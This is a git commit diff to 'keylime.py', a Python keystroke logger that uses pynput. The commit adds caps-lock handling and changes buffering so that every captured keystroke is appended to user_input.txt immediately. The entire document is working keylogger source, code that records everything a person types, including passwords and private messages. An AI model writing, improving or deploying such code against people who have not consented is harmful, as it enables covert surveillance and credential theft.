25f660a85fb234ff1f35407d7150fa3c7740cb1c
Valentina Guedez Mercado <valgmercado@gmail.com>
2026-07-17 15:13:36 +1000

    Fix issue with capslock in keylime

--- keylime.py
+++ keylime.py
@@ -1,10 +1,14 @@
 from pynput.keyboard import Key, Listener
+import re
+
 input = ""
+caps_lock = False
+BUFF_MAX = 1
 
 def on_press(key):
   global input
+  global caps_lock
   print("{0} pressed".format(key))
-  print(f"String ver is {str(key)}")
 
   if key == Key.enter:
     input += "\n"
@@ -16,18 +20,25 @@ def on_press(key):
     pass
   elif key == Key.alt or key == Key.alt_r or key == Key.alt_l:
     pass
+  elif key == Key.caps_lock:
+    caps_lock = not caps_lock
   elif key == Key.backspace and len(input) == 0:
     pass
   elif key == Key.backspace and len(input) > 0:
     input = input[:-1]
   elif key == Key.ctrl_l or key == Key.ctrl_r:
     pass
-  elif hasattr(key, "char") and key.char is not None:
+  elif hasattr(key, "char") and key.char is not None and not re.search(r'[a-zA-Z0-9]', key.char):
+    print("we're in the space for apostrophes and symbols")
     input += key.char
   else:  
-    input += str(key).strip("'")
+    print("we're in the space for letters")
+    if caps_lock:
+      input += str(key).strip("'").upper()
+    else:
+      input += str(key).strip("'")
   
-  if len(input) >= 20:
+  if len(input) >= BUFF_MAX or key == Key.esc:
     with open("user_input.txt", "a") as file:
       file.write(input)
       input = ""
